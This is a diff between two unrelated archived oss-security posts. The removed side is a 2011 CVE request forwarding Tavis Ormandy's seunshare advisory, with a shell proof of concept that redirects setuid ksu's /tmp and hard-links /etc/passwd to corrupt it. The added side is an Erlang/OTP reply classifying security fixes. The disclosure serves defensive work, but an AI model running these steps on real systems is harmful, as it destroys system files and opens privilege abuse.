@@ -1,135 +1,65 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/02/23/1
-Message-ID: <AANLkTikU=whg384HmvbPcAgDjP_KMqJQ1TGFPz1B081g@mail.gmail.com>
-Date: Tue, 22 Feb 2011 18:33:32 -0700
-From: Kurt Seifried <kurt@...fried.org>
-To: oss-security@...ts.openwall.com
-Subject: CVE Request
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/03/30/5
+Message-ID: <Pine.LNX.4.64.1103301936350.10609@arwen.otp.ericsson.se>
+Date: Wed, 30 Mar 2011 19:42:29 +0200
+From: <pan@...ang.org>
+To: oss-security <oss-security@...ts.openwall.com>
+Subject: Re: CVE Request -- Erlang/OTP R14, Erlang/OTP R14B01, Erlang/OTP R14B02 -- multiple security fixes
 Content-Type: text/plain; charset=utf-8
 
-Can we get a CVE # for this please and thank you.
+Hi!
 
--Kurt
+I can only answer for my fixes, answers for the rest will come from the 
+respective developer (hopefully soon :))
 
-From: 	Tavis Ormandy   	2/22/11 6:01 PM 	  	
-To: 	full-disclosure@...ts.grok.org.uk
-Subject: 	[Full-disclosure] Developers should not rely on the
-stickiness of/tmp on Red Hat Linux
-Developers should not rely on the stickiness of /tmp on Red Hat Linux
----------------------------------------------------------------------
+OTP-7178: Not a security issue, just a "bugfix", the "underflow" is 
+floating point conversion underflow, not buffer related.
+OTP-8827: Definitely a security fix
+OTP-8943: Also a security fix
 
-Recent versions of Red Hat Enterprise Linux and Fedora provide seunshare, a
-setuid root utility from policycore-utils intended to make new filesystem
-namespaces available to unprivileged processes for the purpose of sandboxing.
+Cheers,
+/Patrik, OTP
 
-The intention is to permit unprivileged users to mount a new temporary
-directory on /home and /tmp for sandboxed processes, thus preventing
-access to the contents of the original directories in the event of a
-compromise.
+On Wed, 30 Mar 2011, Jan Lieskovsky wrote:
 
-One unintended side effect of making these features available to unprivileged
-processes is that users can now change how setuid applications perceive /tmp
-and /home.
-
-The purpose of this advisory is to inform developers and system administrators
-of affected systems that unprivileged users can effectively remove the
-sticky-bit from the system /tmp directory, and thus relying on the stickiness
-of /tmp on redhat systems is no longer safe.
-
-This advisory is intended for system administrators and developers of
-Red Hat Linux systems; journalists, end users and other non-technical
-readers do not need to be concerned.
-
---------------------
-Affected Software
-------------------------
-
-All known versions of policycore-utils are affected.
-
-I discussed the potentially dangerous implications of introducing this change
-with Red Hat Security in September 2010, but FC14 and RHEL6 still exhibit this
-behaviour post-launch.
-
---------------------
-Consequences
------------------------
-
-A simple example of a common application that is now unsafe is ksu, from the
-krb5 distribution. ksu creates a temporary file in /tmp, then clears it on
-authentication failure.
-
-This is normally a safe operation, as /tmp is protected by the sticky bit.
-
-However, we can use seunshare to interfere with this process.
-
-# create a new directory that we control
-$ mkdir /tmp/seunshare
-
-# use seunshare to mount it on /tmp and /home and run our setuid root binary
-$ seunshare -v -t /tmp/seunshare/ -h /tmp/seunshare/ -- `which ksu`
-root &>/dev/null &
-[1]+ Stopped seunshare -v -t /tmp/seunshare/ -h /tmp/seunshare/ --
-`which ksu` root
-
-# we can examine the mounts visible to the process using the /proc interface
-$ grep /tmp /proc/$(pidof ksu)/mountinfo
-66 64 1:1 /tmp/seunshare /tmp
-
-# here is the temporary file created by ksu during authentication
-$ ls -l /tmp/seunshare/
-total 4.0K
--rw-------. 1 root taviso 35 Feb 18 23:21 krb5cc_0.1
-
-# as we own the directory, and the sticky-bit is not set, we are permitted to
-# unlink files
-$ rm -f /tmp/seunshare/krb5cc_0.1
-
-# now we can replace the file with a link
-$ ln /etc/passwd /tmp/seunshare/krb5cc_0.1
-
-# make ksu authentication fail.
-$ fg
-seunshare -v -t /tmp/seunshare/ -h /tmp/seunshare/ -- `which ksu` root
-
-And /etc/passwd was damaged, thus breaking the system.
-
--------------------
-Credit
------------------------
-
-This bug was discovered by Tavis Ormandy.
-
--------------------
-Greetz
------------------------
-
-Thanks to Kees, Hawkes, Dan and Julien for their help. Greetz to everyone in
-$1$kk1q85Xp$Id.gAcJOg7uelf36VQwJQ/, and all my other elite friends and
-colleagues.
-
--------------------
-Notes
------------------------
-
-Although only an example of damaging a system has been provided, it's
-reasonable to assume that various applications rely on the stickiness of
-/tmp to prevent code execution.
-
-Administrators are advised to remove the setuid bit from seunshare, or
-restrict access to it.
-
--------------------
-References
------------------------
-
-None.
-
--- 
--------------------------------------
-taviso@...xchg8b.com | pgp encrypted mail preferred
--------------------------------------------------------
-
-_______________________________________________
-Full-Disclosure - We believe in it.
-Charter: http://lists.grok.org.uk/full-disclosure-charter.html
-Hosted and sponsored by Secunia - http://secunia.com/
+> Hello Steve, vendors,
+>
+>  based on:
+>  [1] http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=619857
+>
+>  and:
+>  [2] http://www.erlang.org/download/otp_src_R14B.readme
+>  [3] http://www.erlang.org/download/otp_src_R14B01.readme
+>  [4] http://www.erlang.org/download/otp_src_R14B02.readme
+>
+> performed some initial issues review -- erlang-CVE-request.txt
+> attached. But since not sure, which of those are real security
+> flaws and how many CVE ids will be needed for those, Cc-ing
+> also Erlang upstream developers to shed more light into this.
+>
+> The distribution of OTPs is as follows:
+> =======================================
+> Rickard Green:          OTP-8810, OTP-8781, OTP-8925, OTP-9005, OTP-8999
+> Bjorn-Egil Dahlberg:    OTP-8814, OTP-8827, OTP-8943
+> Sverker Eriksson:       OTP-8945, OTP-8716
+> Patrik Nyblom:          OTP-7178, OTP-8780, OTP-8993
+> Raimo Niskanen:         OTP-8729, OTP-8795
+> Bjorn Gustavsson:       OTP-8831, OTP-8892, OTP-9117
+> Niclas Axelsson:        OTP-9101
+> Hans Bolinder:          OTP-8898
+>
+> Rickard, Bjorn-Egil, Sverker, Patrik, Raimo, Bjorn, Niclas, Hans,
+> could you please have a look at the attached review file
+> and reply which of the #20 OTPs in the list are security flaws
+> (so we would know the count of CVE identifiers needed) and which
+> are just bugs? (since you know the Erlang code better than me)
+>
+> Help / guidance from your side is really appreciated to resolve
+> this one.
+>
+> Thank you in advance for your time and cooperation.
+>
+> Regards, Jan.
+> --
+> Jan iankko Lieskovsky / Red Hat Security Response Team
+>
